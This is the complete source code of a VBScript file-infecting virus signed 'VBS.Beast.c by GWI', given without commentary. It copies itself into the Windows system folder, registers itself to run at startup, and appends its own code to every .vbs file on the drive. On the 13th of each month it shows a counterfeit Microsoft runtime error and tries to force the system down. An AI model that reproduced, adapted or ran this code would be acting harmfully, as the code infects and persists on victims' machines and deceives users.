On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
WeAre = Wscript.ScriptFullName
Set Body = FSO.OpenTextFile (WeAre)
Buffa = Body.ReadAll
Body.Close
For s = Len(Buffa) To 1 Step -1
If Mid (Buffa, s, 1) = Chr(126) Then
s = 1
Beast = "'" & Chr(126) + Beast
ElseIf Mid (Buffa, s, 1) <> Chr (126) Then
Beast = Mid (Buffa, s, 1) + Beast
End If
Next
Set WshShell = CreateObject("WScript.Shell")
FSO.CreateTextFile (FSO.GetSpecialFolder(1)&"\w95inf32.vbs")
Set Wr = FSO.CreateTextFile (FSO.GetSpecialFolder(1)&"\w95inf32.vbs", true)
Wr.Write (Beast)
Wr.Close
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Beast", FSO.GetSpecialFolder(1)&"\W95inf32.vbs"
Set DiskRoot = FSO.GetFolder ("\")
Call Recurse (DiskRoot)
If Day (Now) = 13 Then
MsgBox "Runtime Error!" & chr(10) & Chr(10) & "Program C:\WINDOWS\EXPLORER.EXE" & Chr(10) & Chr(10) & _ 
Chr(10) & "abnormal program termination", vbCritical+vbOKonly,"Microsoft Visual C++ Runtime Library"
WShell.Run ("rundll32 krnl386.exe,exitkernel"),vbHide
End If
Function DoFile (CFile)
Set VictimF = CFile
Attrib = VictimF.Attributes
VictimF.Attributes = Normal
Buffa = ""
Set Body = FSO.OpenTextFile (CFile)
Buffa = Body.ReadAll
Body.Close
If Mid (Buffa, Len(Buffa), 1) <> "#" Then
Set Body = FSO.OpenTextFile (VictimF, 8)
Body.Write Beast
Body.Close
End If
VictimF.Attributes = Attrib
End Function
Function Recurse (Folder2scan)
Set Gamno = Folder2Scan.SubFolders
For Each goo In Gamno 
Call Recurse (goo)
Next
Set FileList = Folder2Scan.Files
For Each CFile In FileList
If FSO.GetExtensionName (CFile.Path) = "vbs" then
Call DoFile (CFile)
ElseIf FSO.GetExtensionName (CFile.Path) = "VBS" Then
Call DoFile (CFile)
End If
Next
End Function
'VBS.Beast.c by GWI
